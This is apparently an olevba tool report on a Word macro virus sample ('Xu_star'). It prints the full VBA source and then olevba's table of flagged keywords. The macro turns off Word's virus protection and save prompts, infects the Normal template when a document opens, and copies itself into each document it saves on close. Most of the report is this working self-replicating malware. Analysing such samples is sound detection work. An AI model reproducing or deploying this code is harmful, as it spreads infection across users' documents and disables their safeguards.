olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xu-bf97d68e776ed9f780e2dc6b8b8aa4f806e430cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Xu-bf97d68e776ed9f780e2dc6b8b8aa4f806e430cf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Xu_star macro Virus  1.00
Private Sub Document_Close()
On Error Resume Next
Dim ADL As Long, NTL As Long
Dim FileNM As String
FileNM = System.Application.Path & "\" & Right(Year(Date), 2) & Month(Date) & Day(Date) & Second(Time) & ".dos"
Dim FNo As Long
ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "'Xu_star macro Virus  1.00" Then
FNo = FreeFile
Open FileNM For Output As #FNo
Print #FNo, "Xu_star 1.00a Welcome!"
Close #FNo
Exit Sub
End If

If ADL > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LinesCount

NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ActiveDocument.Saved = True Then
   ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines NTL, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NTL)
   Call ActiveDocument.Save
   ActiveDocument.Saved = True
End If
End Sub


Private Sub Document_Open()
On Error Resume Next
Dim ADL As Long, NTL As Long

Options.VirusProtection = (100 * 0)
Options.ConfirmConversions = (100 * 0)
Options.SaveNormalPrompt = (100 * 0)

ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

'if Normal not Xu_star virus
'Infect to normalTemplate
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Xu_star macro Virus  1.00" Then
   If NTL > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LinesCount
   ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines ADL, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ADL)
End If
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

